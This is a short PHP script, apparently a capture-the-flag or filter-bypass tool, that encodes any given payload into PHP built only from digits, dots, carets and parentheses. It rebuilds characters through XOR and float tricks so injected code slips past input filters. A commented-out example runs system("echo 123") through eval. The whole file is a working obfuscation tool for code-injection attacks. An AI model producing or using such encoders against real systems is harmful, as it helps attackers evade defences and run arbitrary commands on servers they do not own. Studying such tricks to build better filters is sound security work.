<?php
/**
 * Created by Y4tacker
 **/


function generateTemplate($payload): string
{
    $tmp = "(";
    $payload = preg_replace("/'|\"|;/","",$payload);
    for ($i=0;$i<strlen($payload);$i++){
        if ($payload[$i]=="("){
            $tmp.=")(";
        }elseif ($payload[$i]==")"){
            $tmp.=")";
        }else{
            if ($payload[$i+1]==")"||$payload[$i+1]=="("){
                $tmp.="("."chr(".generateNum(ord($payload[$i])).")".")";
            }else{
                $tmp.="("."chr(".generateNum(ord($payload[$i])).")".").";
            }
        }
    }
    return $tmp;
}

function generateNum($num){
    $ret = '(';
    $numArray = ['(9^9)','(.999999999999999)','(9^((.999999999999999).(.999999999999999)))','(9.9999999999999999^9)','(9.9999999999999999^9^99.999999999999999^99)','((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))',
        '((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99))',
        '((9.9999999999999999^9)^(9.9999999999999999^9^99.999999999999999^99))',
        '((9.9999999999999999)^(9^((.999999999999999).(.999999999999999))))',
        '(9)','(9.9999999999999999)'];
    $num = (string)$num;
    for ($i=0;$i<strlen($num);$i++){
        $tmpNum = $num[$i];
        $ret.=$numArray[$tmpNum];
        if (($i+1)!=strlen($num)){
            $ret.=".";
        }
    }
    $ret.=")";
    return $ret;
}

function replaceChr($payload){
    return preg_replace("/chr/i","(((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))",$payload);
}


//$a=  'system("echo 123");';
//$a = replaceChr(generateTemplate($a));
//eval("$a;");
//echo $a;

echo replaceChr(generateTemplate($argv[1]));
